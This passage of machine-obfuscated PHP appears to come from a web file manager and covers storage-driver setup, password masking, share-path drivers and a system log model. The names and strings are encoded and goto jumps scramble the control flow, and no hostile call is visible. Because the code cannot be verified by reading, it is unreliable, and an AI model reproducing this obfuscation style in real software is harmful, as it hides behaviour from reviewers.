Model($ÓŸª¢ö[809])->get($ÓŸª¢ö[819]); $¾â“ ©í = json_decode($¾â“ ©í, !0); if (!$¾â“ ©í) { return; } $¾â“ ©í[$ÓŸª¢ö[790]] = $¡Şõ¬ô•; Model($ÓŸª¢ö[809])->set(array($ÓŸª¢ö[819] => $¾â“ ©í)); } public function checkPwd($š¢Ù”Ö, &$á¶çí¥Ï) { $ßíšö¥ô =& $_SERVER[ò«¥Ê‡å]; if (empty($á¶çí¥Ï[$ßíšö¥ô[6]])) { return; } $”‡„ùé = json_decode($á¶çí¥Ï[$ßíšö¥ô[6]], !0); $ïÌ’òØ— = $ßíšö¥ô[12]; $·×¨üØ‡ = array($ßíšö¥ô[2223], $ßíšö¥ô[2224], $ßíšö¥ô[936]); foreach ($·×¨üØ‡ as $ˆÅ«©øº) { if (isset($”‡„ùé[$ˆÅ«©øº])) { $ïÌ’òØ— = $ˆÅ«©øº; break; } } if (!$ïÌ’òØ—) { return; } $àÚ•É°î = $this->getConfig($š¢Ù”Ö); $èÚÀ¥‹÷ = $àÚ•É°î[$ïÌ’òØ—]; $¼‰ø’¿¾ = $”‡„ùé[$ïÌ’òØ—]; if ($¼‰ø’¿¾ == str_repeat($ßíšö¥ô[205], strlen($èÚÀ¥‹÷))) { $”‡„ùé[$ïÌ’òØ—] = $èÚÀ¥‹÷; $á¶çí¥Ï[$ßíšö¥ô[6]] = json_encode($”‡„ùé); } else { if ($¼‰ø’¿¾ != $èÚÀ¥‹÷) { $á¶çí¥Ï[$ßíšö¥ô[2222]] = $ßíšö¥ô[90]; } } } public function checkConfig(&$øÚ¹¾±ı, $üÓË«İ = false) { $¿ƒÓúÛ„ =& $_SERVER[ò«¥Ê‡å]; $éÜ•ÕÎò = strtolower($øÚ¹¾±ı[$¿ƒÓúÛ„[97]]); $ñôöÁ» = json_decode($øÚ¹¾±ı[$¿ƒÓúÛ„[6]], !0); foreach ($ñôöÁ» as $ôì¦ß³ => $öçÓ«•Ñ) { if (is_string($öçÓ«•Ñ)) { $ñôöÁ»[$ôì¦ß³] = trim($öçÓ«•Ñ); } } $ñôöÁ»[$¿ƒÓúÛ„[2225]] = rand_string(6); $°ŞÓöë² = $GLOBALS[$¿ƒÓúÛ„[6]][$¿ƒÓúÛ„[91]][$¿ƒÓúÛ„[872]]; $Ÿ¤ìâÈú = isset($°ŞÓöë²[$éÜ•ÕÎò]) ? $°ŞÓöë²[$éÜ•ÕÎò] : ucfirst($éÜ•ÕÎò); $Äà§ğºµ = $¿ƒÓúÛ„[76] . $Ÿ¤ìâÈú; if (!$Ÿ¤ìâÈú || !class_exists($Äà§ğºµ)) { if ($üÓË«İ) { return LNG($¿ƒÓúÛ„[2226]); } write_log(array($¿ƒÓúÛ„[2227], $øÚ¹¾±ı, get_caller_info()), $¿ƒÓúÛ„[2228]); show_json(LNG($¿ƒÓúÛ„[2226]), !1, $øÚ¹¾±ı); } $°ÁÔ¡® = new $Äà§ğºµ($ñôöÁ»); if (in_array($éÜ•ÕÎò, $°ÁÔ¡®->objectDriver)) { if (!$°ÁÔ¡®->isBucketCors() && !$°ÁÔ¡®->setBucketCors()) { $®éãÁ÷± = LNG($¿ƒÓúÛ„[2229]); $®éãÁ÷± .= $¿ƒÓúÛ„[2230] . LNG($¿ƒÓúÛ„[2231]); if ($üÓË«İ) { return $®éãÁ÷±; } show_json($®éãÁ÷±, !1); } } $ïÌˆƒ‹Ò = rtrim($ñôöÁ»[$¿ƒÓúÛ„[1227]], $¿ƒÓúÛ„[8]) . $¿ƒÓúÛ„[8]; $ÈĞöºğó = $°ÁÔ¡®->getPath($ïÌˆƒ‹Ò . $¿ƒÓúÛ„[1231]); if (!$°ÁÔ¡®->mkfile($ÈĞöºğó)) { if ($üÓË«İ) { return LNG($¿ƒÓúÛ„[2229]); } show_json(LNG($¿ƒÓúÛ„[2229]), !1); } $ñôöÁ»[$¿ƒÓúÛ„[1227]] = $ïÌˆƒ‹Ò; $øÚ¹¾±ı[$¿ƒÓúÛ„[6]] = json_encode($ñôöÁ»); $øÚ¹¾±ı[$¿ƒÓúÛ„[97]] = $Ÿ¤ìâÈú; return !0; } public function driverListSystem() { $å¬³Œ¨± =& $_SERVER[ò«¥Ê‡å]; $Â–ÙıÅ– = parent::listData(); $æ¤œÎÇ = array(); foreach ($Â–ÙıÅ– as $¾¾ä) { unset($¾¾ä[$å¬³Œ¨±[217]], $¾¾ä[$å¬³Œ¨±[87]]); $¾¾ä[$å¬³Œ¨±[6]] = json_decode($¾¾ä[$å¬³Œ¨±[6]], !0); $æ¤œÎÇ[] = $¾¾ä; } return $æ¤œÎÇ; } public function defaultDriver() { $³™ÆµûÑ =& $_SERVER[ò«¥Ê‡å]; $ŠÎ¥‡­ = parent::listData(); $Ğó¦ÔÁó = array_filter_by_field($ŠÎ¥‡­, $³™ÆµûÑ[37], 1); $Ğó¦ÔÁó = $Ğó¦ÔÁó[0]; if ($Ğó¦ÔÁó) { $Ğó¦ÔÁó[$³™ÆµûÑ[6]] = json_decode($Ğó¦ÔÁó[$³™ÆµûÑ[6]], !0); } return $Ğó¦ÔÁó; } public function driverInfo($ÚşÜû¯Ş) { $è– Ï” =& $_SERVER[ò«¥Ê‡å]; $ëùöè¶ = array_to_keyvalue(parent::listData(), $è– Ï”[445]); if (!isset($ëùöè¶[$ÚşÜû¯Ş])) { return !1; } $Ÿ‚·®Ôû = $ëùöè¶[$ÚşÜû¯Ş]; $Ÿ‚·®Ôû[$è– Ï”[6]] = json_decode($Ÿ‚·®Ôû[$è– Ï”[6]], !0); return $Ÿ‚·®Ôû; } public function remove($Ê®ùÔÈ¡) { $this->removeShareItems($Ê®ùÔÈ¡); return parent::remove($Ê®ùÔÈ¡); } public function removeWithFile($º¸È•‚ò, $º¨¹ì˜ô) { $Æç¯û¬ =& $_SERVER[ò«¥Ê‡å]; $Öñğ®ûÂ = array($Æç¯û¬[863] => $º¸È•‚ò); $äÏú»¾ = Model($Æç¯û¬[514])->where($Öñğ®ûÂ)->count(); $òğ–æÎÙ = Model($Æç¯û¬[514])->where($Öñğ®ûÂ)->sum($Æç¯û¬[78]); $ÉÄÖ¢Œ = $º¨¹ì˜ô . $Æç¯û¬[2232] . $º¸È•‚ò; $ğâÖúÒ = LNG($º¨¹ì˜ô == $Æç¯û¬[590] ? $Æç¯û¬[2233] : $Æç¯û¬[2234]); $»Š¢úîû = new TaskFileTransfer($ÉÄÖ¢Œ, $Æç¯û¬[2228], $äÏú»¾, $ğâÖúÒ . "\50{$º¸È•‚ò}\51"); $»Š¢úîû->task[$Æç¯û¬[802]] = (double) $òğ–æÎÙ; $êÇÏïâ = KodIO::defaultDriver(); $±áùˆ¾î = $êÇÏïâ[$Æç¯û¬[445]]; $Å±éÆ‹ = "\x7b\151\x6f\72{$±áùˆ¾î}\175\x2f"; $ñäÑí‹¿ = !0; $™¾£Šô¾ = array(); $ÚÂë —Ì = Model($Æç¯û¬[216])->where($Öñğ®ûÂ)->field($Æç¯û¬[2235])->select(); foreach ($ÚÂë —Ì as $¾‰’£­) { $¹×¤œ›‘ = $¾‰’£­[$Æç¯û¬[86]]; $°ĞŞùËâ = $Å±éÆ‹ . str_replace("\173\x69\x6f\72{$º¸È•‚ò}\175\57", $Æç¯û¬[12], $¹×¤œ›‘); if (!IO::exist($¹×¤œ›‘)) { $™¾£Šô¾[] = $¾‰’£­[$Æç¯û¬[511]]; $»Š¢úîû->updateFileEnd($¾‰’£­[$Æç¯û¬[32]], $¾‰’£­[$Æç¯û¬[78]]); continue; } if (IO::exist($°ĞŞùËâ)) { $»Š¢úîû->updateFileEnd($¾‰’£­[$Æç¯û¬[32]], $¾‰’£­[$Æç¯û¬[78]]); continue; } if (!IO::move($¹×¤œ›‘, get_path_father($°ĞŞùËâ))) { $ñäÑí‹¿ = !1; break; } $Öñğ®ûÂ = array($Æç¯û¬[511] => $¾‰’£­[$Æç¯û¬[511]]); $°ûñµ©¢ = array($Æç¯û¬[863] => $±áùˆ¾î, $Æç¯û¬[86] => $°ĞŞùËâ); Model($Æç¯û¬[216])->where($Öñğ®ûÂ)->save($°ûñµ©¢); } $this->removeByFileID($™¾£Šô¾); if (!$ñäÑí‹¿) { $»Š¢úîû->stop($ÉÄÖ¢Œ); return !1; } $»Š¢úîû->end(); if ($º¨¹ì˜ô == $Æç¯û¬[1868]) { $this->remove($º¸È•‚ò); } } public function progress($‹¥³ƒôò, $¿°ÄŒ††) { return Task::get($¿°ÄŒ†† . $_SERVER[ò«¥Ê‡å][2232] . $‹¥³ƒôò); } private function removeByFileID($œöˆ©Ä = array()) { $åÜõˆ¥€ =& $_SERVER[ò«¥Ê‡å]; if (empty($œöˆ©Ä)) { return; } $«™Œå¹¥ = array($åÜõˆ¥€[511] => array($åÜõˆ¥€[7], $œöˆ©Ä)); $ä÷ÑˆöÕ = Model($åÜõˆ¥€[1380])->where($«™Œå¹¥)->field($åÜõˆ¥€[183])->select(); if (!$ä÷ÑˆöÕ) { return; } $ä÷ÑˆöÕ = array_to_keyvalue($ä÷ÑˆöÕ, $åÜõˆ¥€[12], $åÜõˆ¥€[183]); foreach ($ä÷ÑˆöÕ as $´£ùŒèµ) { Model($åÜõˆ¥€[460])->removeNow($´£ùŒèµ, !1); } } private function removeShareItems($¸÷™úæ) { $ığŸ‘å³ =& $_SERVER[ò«¥Ê‡å]; $²ËğÑ¬ˆ = "\173\151\x6f\x3a{$¸÷™úæ}\175\x2f"; $ Æú¯â = array($ığŸ‘å³[183] => 0, $ığŸ‘å³[1222] => array($ığŸ‘å³[429], "{$²ËğÑ¬ˆ}\x25")); $›·ÆÜôş = Model($ığŸ‘å³[1879])->where($ Æú¯â)->field($ığŸ‘å³[635])->select(); if (empty($›·ÆÜôş)) { return; } $•ª£Ş¦ = array_to_keyvalue($›·ÆÜôş, $ığŸ‘å³[12], $ığŸ‘å³[635]); Model($ığŸ‘å³[634])->remove($•ª£Ş¦); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\56\114\x69\x67\x68\x74\101\x70\x70"; public $modelType = "\123\x79\163\164\145\x6d\117\160\164\151\157\156"; public $field = array("\156\141\155\145", "\x67\162\157\165\160", "\144\x65\163\x63", "\x63\157\156\x74\145\x6e\x74"); public function listData($ú¤“·˜ = false, $¯æç–ğÎ = "\x6d\x6f\x64\x69\x66\171\x54\x69\155\145", $¦Ï•œ = true) { return parent::listData($ú¤“·˜, $¯æç–ğÎ, $¦Ï•œ); } public function remove($¤¶¹û“¯) { $Ûì‰İ×Ó = $this->findByName($¤¶¹û“¯); if (!$Ûì‰İ×Ó) { return !1; } return parent::remove($Ûì‰İ×Ó[$_SERVER[ò«¥Ê‡å][445]]); } public function add($ƒÅ’–Ÿ¿) { if ($this->findByName($ƒÅ’–Ÿ¿[$_SERVER[ò«¥Ê‡å][32]])) { return !1; } return parent::insert($ƒÅ’–Ÿ¿); } public function update($‰‹ø×³î, $”ÅÍåúô) { $Ì´ šôĞ =& $_SERVER[ò«¥Ê‡å]; $™Î©‘Ï¥ = $this->findByName($‰‹ø×³î); $ÇÑêŠÉş = $this->findByName($”ÅÍåúô[$Ì´ šôĞ[32]]); if (!$™Î©‘Ï¥ || $ÇÑêŠÉş && $ÇÑêŠÉş[$Ì´ šôĞ[445]] != $™Î©‘Ï¥[$Ì´ šôĞ[445]]) { return !1; } return parent::update($™Î©‘Ï¥[$Ì´ šôĞ[445]], $”ÅÍåúô); } } goto Dˆ·ì„â¿¨; b†á·°„Ûµ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($Ûïí¤Ğ‰) { $this->pathParse = $Ûïí¤Ğ‰; $this->model = Model($_SERVER[ò«¥Ê‡å][1380]); } public function getPathOuter($î¤êœÊù) { $‚ˆìğ“ =& $_SERVER[ò«¥Ê‡å]; if (!$î¤êœÊù) { return $î¤êœÊù; } $é—ÃøĞŒ = $this->parse($î¤êœÊù); return trim(KodIO::makeShare($this->pathParse[$‚ˆìğ“[445]], $é—ÃøĞŒ[$‚ˆìğ“[445]]), $‚ˆìğ“[8]); } protected function infoParse($ÚÖŸÉâ, $÷Îä÷Áï = false, $¢¹ ç‚ = false) { $©„øé€· =& $_SERVER[ò«¥Ê‡å]; $¡ñ„ÕŞ = $this->pathParse[$©„øé€·[445]]; $ğæ„èº¬ = trim($this->pathParse[$©„øé€·[1215]], $©„øé€·[8]); return Action($©„øé€·[1387])->sharePathInfo($¡ñ„ÕŞ, $ğæ„èº¬, $÷Îä÷Áï); } public function infoFull($¹›²£Õ) { $ıÒ¦ŒÙ =& $_SERVER[ò«¥Ê‡å]; $™‘Œªİõ = explode($ıÒ¦ŒÙ[8], trim($¹›²£Õ, $ıÒ¦ŒÙ[8])); if (count($™‘Œªİõ) > 1) { $ùÂ¯†²á = implode($ıÒ¦ŒÙ[8], array_splice($™‘Œªİõ, 1)); $µìµ²”¢ = $this->model->pathInfoByPath($™‘Œªİõ[0], $ùÂ¯†²á); if (!$µìµ²”¢) { return !1; } $this->pathParse[$ıÒ¦ŒÙ[1215]] = $µìµ²”¢[$ıÒ¦ŒÙ[183]]; } return $this->infoParse($¹›²£Õ); } public function listAll($ùÒ½ïÏ) { $¬Èş¯ù =& $_SERVER[ò«¥Ê‡å]; $‘÷Úşø® = IO::info($this->pathParse[$¬Èş¯ù[86]]); if (!$‘÷Úşø®) { return array(); } $şâ·Îù = $this->model->listAll($ùÒ½ïÏ); $õÓïèõÌ = Model($¬Èş¯ù[634])->getInfo($‘÷Úşø®[$¬Èş¯ù[635]]); foreach ($şâ·Îù as &$§Í¨È¯€) { check_abort(); $§Í¨È¯€[$¬Èş¯ù[89]] = Action($¬Èş¯ù[1387])->_shareItemeParse($§Í¨È¯€[$¬Èş¯ù[89]], $õÓïèõÌ); } unset($§Í¨È¯€); return $şâ·Îù; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($³üå¸¤é) { $this->pathParse = $³üå¸¤é; $this->model = Model($_SERVER[ò«¥Ê‡å][1380]); } protected function infoParse($²©²‚İ­, $·¥è‹äá = false, $á¯¸Ç¥Ã = false) { $×àğŠËš =& $_SERVER[ò«¥Ê‡å]; return Action($×àğŠËš[1221])->sharePathInfo($this->pathParse[$×àğŠËš[86]], !0, $·¥è‹äá); } public function listPath($€ğÃò¶­, $Ş‘Á‰·Æ = false) { $„¯ï¤ş =& $_SERVER[ò«¥Ê‡å]; $í¤’Ÿ¥‡ = parent::listPath($€ğÃò¶­, $Ş‘Á‰·Æ); if (!$í¤’Ÿ¥‡) { return $í¤’Ÿ¥‡; } if (is_array($í¤’Ÿ¥‡[$„¯ï¤ş[1388]])) { $í¤’Ÿ¥‡[$„¯ï¤ş[1388]] = Action($„¯ï¤ş[1221])->shareItemInfo($í¤’Ÿ¥‡[$„¯ï¤ş[1388]]); } foreach ($í¤’Ÿ¥‡ as $®Şìà©Ñ => $é–Òé£…) { if (!in_array($®Şìà©Ñ, array($„¯ï¤ş[85], $„¯ï¤ş[84]))) { continue; } foreach ($é–Òé£… as $•¸Ïá ¥ => $ç‰Í†÷ø) { $í¤’Ÿ¥‡[$®Şìà©Ñ][$•¸Ïá ¥] = Action($„¯ï¤ş[1221])->shareItemInfo($ç‰Í†÷ø); } } return $í¤’Ÿ¥‡; } public function listAll($Şç¨ÈÅ²) { $±Ù­ë¯ª =& $_SERVER[ò«¥Ê‡å]; $¿Ó§”¼¤ = IO::info($this->pathParse[$±Ù­ë¯ª[86]]); if (!$¿Ó§”¼¤) { return array(); } $Ş‹ã™¬ù = $this->model->listAll($Şç¨ÈÅ²); foreach ($Ş‹ã™¬ù as &$¯½ìÕ) { $¯½ìÕ[$±Ù­ë¯ª[89]] = Action($±Ù­ë¯ª[1221])->shareItemInfo($¯½ìÕ[$±Ù­ë¯ª[89]]); } unset($¯½ìÕ); return $Ş‹ã™¬ù; } } class PathDriverDriverShareItem { public function __construct($—ûîÚë’) { $this->pathParse = $—ûîÚë’; } public function __call($¡äù¦ìù, $©¿ëŠ—±) { $ìãÑß²ğ =& $_SERVER[ò«¥Ê‡å]; if (method_exists($this, $¡äù¦ìù)) { return; } $À¯ “ú° = call_user_func_array(array($ìãÑß²ğ[1389], $¡äù¦ìù), $©¿ëŠ—±); $†‚¬£°Ø = array($ìãÑß²ğ[1390], $ìãÑß²ğ[1391], $ìãÑß²ğ[1392], $ìãÑß²ğ[1393], $ìãÑß²ğ[588], $ìãÑß²ğ[590], $ìãÑß²ğ[1394], $ìãÑß²ğ[109], $ìãÑß²ğ[1395], $ìãÑß²ğ[1396]); if (in_array($¡äù¦ìù, $†‚¬£°Ø)) { $À¯ “ú° = $this->getPathOuter($À¯ “ú°); } return $À¯ “ú°; } public function copy($Ì‚úéª, $”º¡ß‰, $¹Û”§¢É = false, $…²ß›¥Æ = false) { return $this->copyMove($Ì‚úéª, $”º¡ß‰, $¹Û”§¢É, $_SERVER[ò«¥Ê‡å][588], $…²ß›¥Æ); } public function move($Éá¼ìü‘, $£›•ïâ¡, $”¾¥ğ‹Â = false, $°¸âºÖÙ = false) { return $this->copyMove($Éá¼ìü‘, $£›•ïâ¡, $”¾¥ğ‹Â, $_SERVER[ò«¥Ê‡å][590], $°¸âºÖÙ); } private function copyMove($Âıªïö¥, $Â¯ÏåÇ, $¿ä±ïâÍ, $§Üô§ä, $‘æá˜ÃÕ = false) { $é…±ıÁ‡ =& $_SERVER[ò«¥Ê‡å]; $œûı¨Ë = $Â¯ÏåÇ; $¦Ø’¹« = IO::driverMake($Â¯ÏåÇ); if ($¦Ø’¹«->pathParse[$é…±ıÁ‡[1198]]) { $Â¯ÏåÇ = $¦Ø’¹«->pathParse[$é…±ıÁ‡[1198]]; } else { $Â¯ÏåÇ = $œûı¨Ë; } $€ƒÀí‰ö = IO::copyMove($Âıªïö¥, $Â¯ÏåÇ, $¿ä±ïâÍ, $§Üô§ä, $‘æá˜ÃÕ); $€ƒÀí‰ö = $this->getPathOuter($€ƒÀí‰ö); return $€ƒÀí‰ö; } public function pathThis($…™â÷¼·) { return get_path_this($this->pathParse[$_SERVER[ò«¥Ê‡å][86]]); } public function pathFather($ØÏ Ûä) { return get_path_father($this->pathParse[$_SERVER[ò«¥Ê‡å][86]]); } public function iconvSystem($ôŒ™²ÏÒ) { return $ôŒ™²ÏÒ; } protected function infoParse($ÄçÍãÔÙ, $·Êª“ = false) { $‹÷ ¦ßÜ =& $_SERVER[ò«¥Ê‡å]; $ÃÆÆ¬ñÇ = $this->pathParse[$‹÷ ¦ßÜ[531]][$‹÷ ¦ßÜ[1222]] . $this->pathParse[$‹÷ ¦ßÜ[1215]]; if ($·Êª“) { $‡’½Ô‰ = IO::infoWithChildren($ÃÆÆ¬ñÇ); } else { $‡’½Ô‰ = IO::info($ÃÆÆ¬ñÇ); } $«…¤öù = $this->pathParse[$‹÷ ¦ßÜ[531]]; return Action($‹÷ ¦ßÜ[1387])->_shareItemeParse($‡’½Ô‰, $«…¤öù); } public function listAll($êââ—Ù) { $¥ÑÎğ‚ =& $_SERVER[ò«¥Ê‡å]; $«çÈ‹« = IO::listAll($êââ—Ù); $€ÍÕšæÃ = rtrim($this->pathParse[$¥ÑÎğ‚[531]][$¥ÑÎğ‚[1222]], $¥ÑÎğ‚[8]); foreach ($«çÈ‹« as &$ô°Şºö) { $ô°Şºö[$¥ÑÎğ‚[86]] = $this->pathDriver . $¥ÑÎğ‚[8] . ltrim(substr($ô°Şºö[$¥ÑÎğ‚[86]], strlen($€ÍÕšæÃ)), $¥ÑÎğ‚[8]); } unset($ô°Şºö); return $«çÈ‹«; } public function listAllSimple($õ”Œõ†ã, $®†½éÂ÷ = false) { $¤ËîÉáğ =& $_SERVER[ò«¥Ê‡å]; $Íù×Óæ = $this->listAll($õ”Œõ†ã); $¸©ğŞÄ„ = $this->pathParse[$¤ËîÉáğ[465]]; if (trim($¸©ğŞÄ„, $¤ËîÉáğ[8]) == trim(get_path_father($¸©ğŞÄ„), $¤ËîÉáğ[8])) { $®†½éÂ÷ = !0; } return IO::init($¤ËîÉáğ[12])->listAllSimpleMake($Íù×Óæ, $¸©ğŞÄ„, $®†½éÂ÷); } public function getPathOuter($¡š­çşÕ) { $‘×Ú³èñ =& $_SERVER[ò«¥Ê‡å]; $»‡šßÄ‡ = KodIO::parse($¡š­çşÕ); if ($»‡šßÄ‡[$‘×Ú³èñ[33]] == KodIO::KOD_SHARE_ITEM) { return $»‡šßÄ‡[$‘×Ú³èñ[86]]; } $ûƒ¬ğ®± = KodIO::clear($¡š­çşÕ); $´°º´®ê = KodIO::clear($this->pathParse[$‘×Ú³èñ[531]][$‘×Ú³èñ[1222]]); $ÚıÔ…Ä¼ = substr($ûƒ¬ğ®±, strlen($´°º´®ê)); if (substr($ûƒ¬ğ®±, 0, strlen($´°º´®ê)) != $´°º´®ê) { return !1; } return $this->pathParse[$‘×Ú³èñ[1216]] . $‘×Ú³èñ[8] . ltrim($ÚıÔ…Ä¼, $‘×Ú³èñ[8]); } public function getType() { $ÃÏ¥èÌ =& $_SERVER[ò«¥Ê‡å]; $®À‡œš´ = str_replace($ÃÏ¥èÌ[76], $ÃÏ¥èÌ[12], get_class($this)); return strtolower($®À‡œš´); } public function isTypeObject($€—Ñôú) { return IO::isTypeObject($€—Ñôú); } public function info($Ææª™öÒ) { return $this->infoParse($Ææª™öÒ); } public function infoAuth($í£€¬¢€) { return $this->infoParse($í£€¬¢€); } public function infoWithChildren($ÜÂ“ŸÖç) { return $this->infoParse($ÜÂ“ŸÖç, !0); } public function infoFull($×íîö‹ƒ) { return $this->infoParse($×íîö‹ƒ); } } goto BÅï¼ÊÜŒ…; D‹Ê¬ØğíÃ: define($_SERVER[ò«¥Ê‡å][284], 1); define($_SERVER[ò«¥Ê‡å][285], 2); define($_SERVER[ò«¥Ê‡å][286], 3); goto A ºáÔõºˆ; Dˆ·ì„â¿¨: class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\164\145\x6d\x5f\x6c\157\147"; protected $dataAuto = array(array("\143\162\x65\141\x74\x65\124\151\x6d\145", "\x74\x69\x6d\x65", "\151\156\163\145\x72\164", "\x66\165\156\143\x74\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $‘ˆ½¦¨Û =& $_SERVER[ò«¥Ê‡å]; return array($‘ˆ½¦¨Û[2236] => LNG($‘ˆ½¦¨Û[2237]), $‘ˆ½¦¨Û[2238] => LNG($‘ˆ½¦¨Û[2239]), $‘ˆ½¦¨Û[1842] => LNG($‘ˆ½¦¨Û[2240]), $‘ˆ½¦¨Û[2241] => LNG($‘ˆ½¦¨Û[2242]), $‘ˆ½¦¨Û[2243] => LNG($‘ˆ½¦¨Û[2244]), $‘ˆ½¦¨Û[2245] => LNG($‘ˆ½¦¨Û[2246]), $‘ˆ½¦¨Û[2247] => LNG($‘ˆ½¦¨Û[2248]), $‘ˆ½¦¨Û[1872] => LNG($‘ˆ½¦¨Û[2248]), $‘ˆ½¦¨Û[1873] => LNG($‘ˆ½¦¨Û[2249]), $‘ˆ½¦¨Û[2250] => LNG($‘ˆ½¦¨Û[2251]), $‘ˆ½¦¨Û[2252] => LNG($‘ˆ½¦¨Û[2253]), $‘ˆ½¦¨Û[2254] => LNG($‘ˆ½¦¨Û[2255]), $‘ˆ½¦¨Û[2256] => LNG($‘ˆ½¦¨Û[2257]), $‘ˆ½¦¨Û[1870] => LNG($‘ˆ½¦¨Û[2258]), $‘ˆ½¦¨Û[2259] => LNG($‘ˆ½¦¨Û[2260]), $‘ˆ½¦¨Û[1877] => LNG($‘ˆ½¦¨Û[2261]), $‘ˆ½¦¨Û[2262] => LNG($‘ˆ½¦¨Û[2263]), $‘ˆ½¦¨Û[2264] => LNG($‘ˆ½¦¨Û[2265]), $‘ˆ½¦¨Û[2266] => LNG($‘ˆ½¦¨Û[2267]), $‘ˆ½¦¨Û[2268] => LNG($‘ˆ½¦¨Û[2269]), $‘ˆ½¦¨Û[1880] => LNG($‘ˆ½¦¨Û[2270]), $‘ˆ½¦¨Û[1881] => LNG($‘ˆ½¦¨Û[2271]), $‘ˆ½¦¨Û[2272] => LNG($‘ˆ½¦¨Û[2273]), $‘ˆ½¦¨Û[2274] => LNG($‘ˆ½¦¨Û[2275]), $‘ˆ½¦¨Û[2276] => LNG($‘ˆ½¦¨Û[2277]), $‘ˆ½¦¨Û[1875] => LNG($‘ˆ½¦¨Û[2278]), $‘ˆ½¦¨Û[2279] => LNG($‘ˆ½¦¨Û[2280]), $‘ˆ½¦¨Û[1874] => LNG($‘ˆ½¦¨Û[2281]), $‘ˆ½¦¨Û[2282] => LNG($‘ˆ½¦¨Û[2283]), $‘ˆ½¦¨Û[2284] => LNG($‘ˆ½¦¨Û[2285]), $‘ˆ½¦¨Û[2286] => LNG($‘ˆ½¦¨Û[2285]), $‘ˆ½¦¨Û[2287] => LNG($‘ˆ½¦¨Û[2288]), $‘ˆ½¦¨Û[2289] => LNG($‘ˆ½¦¨Û[2289]), $‘ˆ½¦¨Û[2290] => LNG($‘ˆ½¦¨Û[1846]), $‘ˆ½¦¨Û[2291] => LNG($‘ˆ½¦¨Û[2292]), $‘ˆ½¦¨Û[2293] => LNG($‘ˆ½¦¨Û[2294]), $‘ˆ½¦¨Û[2295] => LNG($‘ˆ½¦¨Û[2296]), $‘ˆ½¦¨Û[2297] => LNG($‘ˆ½¦¨Û[2298]), $‘ˆ½¦¨Û[2299] => LNG($‘ˆ½¦¨Û[2300]), $‘ˆ½¦¨Û[2301] => LNG($‘ˆ½¦¨Û[2301]), $‘ˆ½¦¨Û[2302] => LNG($‘ˆ½¦¨Û[2303]), $‘ˆ½¦¨Û[2304] => LNG($‘ˆ½¦¨Û[2305]), $‘ˆ½¦¨Û[2306] => LNG($‘ˆ½¦¨Û[2307]), $‘ˆ½¦¨Û[2308] => LNG($‘ˆ½¦¨Û[2309]), $‘ˆ½¦¨Û[2310] => LNG($‘ˆ½¦¨Û[2311]), $‘ˆ½¦¨Û[2312] => LNG($‘ˆ½¦¨Û[2313])); } private function typeFile() { $ÙÅ«•ûÍ =& $_SERVER[ò«¥Ê‡å]; $¢ÕÊù¯ = array($ÙÅ«•ûÍ[1877] => array($ÙÅ«•ûÍ[1878]), $ÙÅ«•ûÍ[2254] => array($ÙÅ«•ûÍ[2314]), $ÙÅ«•ûÍ[2256] => array($ÙÅ«•ûÍ[2315]), $ÙÅ«•ûÍ[1870] => array($ÙÅ«•ûÍ[1871], $ÙÅ«•ûÍ[2316]), $ÙÅ«•ûÍ[2264] => array(), $ÙÅ«•ûÍ[2266] => array(), $ÙÅ«•ûÍ[2268] => array(), $ÙÅ«•ûÍ[1880] => array($ÙÅ«•ûÍ[1882]), $ÙÅ«•ûÍ[1881] => array($ÙÅ«•ûÍ[1882]), $ÙÅ«•ûÍ[2272] => array($ÙÅ«•ûÍ[2317]), $ÙÅ«•ûÍ[2274] => array($ÙÅ«•ûÍ[2317]), $ÙÅ«•ûÍ[2276] => array($ÙÅ«•ûÍ[2318]), $ÙÅ«•ûÍ[2262] => array($ÙÅ«•ûÍ[2319]), $ÙÅ«•ûÍ[1875] => array($ÙÅ«•ûÍ[2320]), $ÙÅ«•ûÍ[2279] => array($ÙÅ«•ûÍ[2321]), $ÙÅ«•ûÍ[1874] => array($ÙÅ«•ûÍ[1876])); return $¢ÕÊù¯; } private function typeAll() { $¾«òŠ˜ =& $_SERVER[ò«¥Ê‡å]; $Å¤Ğå‰ß = $this->typeList; $³ÏÊÙªå = array_filter($this->typeFile()); foreach ($³ÏÊÙªå as $¦ÀğÏÖê => $êÌ“Íà) { $Å¤Ğå‰ß[$êÌ“Íà[0]] = $Å¤Ğå‰ß[$¦ÀğÏÖê]; } $Å¤Ğå‰ß[$¾«òŠ˜[1882]] = LNG($¾«òŠ˜[2322]); $Å¤Ğå‰ß[$¾«òŠ˜[2317]] = LNG($¾«òŠ˜[2323]); return $Å¤Ğå‰ß; } public function addLog($ù†Åûİé, $²äºàñ = array()) { $½ŒõØ‰ =& $_SERVER[ò«¥Ê‡å]; if (!isset($this->typeList[$ù†Åûİé])) { return; } $ŠéÅ–É” = isset($²äºàñ[$½ŒõØ‰[1701]]) ? $²äºàñ[$½ŒõØ‰[1701]] : 0; if (!$ŠéÅ–É”) { $ŠéÅ–É” = Session::get($½ŒõØ‰[2036]); } if ($ù†Åûİé == $½ŒõØ‰[2291] && is_array($²äºàñ[$½ŒõØ‰[2324]]) && !$²äºàñ[$½ŒõØ‰[2324]]) { return; } $¾„Æß³  = get_client_ip(); if (!$²äºàñ || strlen(json_encode($²äºàñ)) >= 1024) { $²äºàñ = array($½ŒõØ‰[2325] => $¾„Æß³ ); } else { if (is_array($²äºàñ)) { $²äºàñ[$½ŒõØ‰[2325]] = $¾„Æß³ ; } else { $²äºàñ = array($½ŒõØ‰[1249] => $²äºàñ, $½ŒõØ‰[2325] => $¾„Æß³ ); } } $²äºàñ = array($½ŒõØ‰[1691] => Session::sign(), $½ŒõØ‰[1692] => intval($ŠéÅ–É”), $½ŒõØ‰[33] => $ù†Åûİé, $½ŒõØ‰[1694] => json_encode($²äºàñ)); parent::add($²äºàñ); } public function remove($«¦±Üß’) { $this->where(array($_SERVER[ò«¥Ê‡å][463] => $«¦±Üß’))->delete(); } private function _makeOrder($¨ŠâÛôÚ = '') { $Ù±­¨¹ú =& $_SERVER[ò«¥Ê‡å]; $ÊïŞÓªŸ = $Ù±­¨¹ú[217]; $ô¯ıÁÖ® = array($Ù±­¨¹ú[493] => $Ù±­¨¹ú[494], $Ù±­¨¹ú[495] => $Ù±­¨¹ú[496]); $—ËŒ˜Øˆ = Input::get($Ù±­¨¹ú[501], 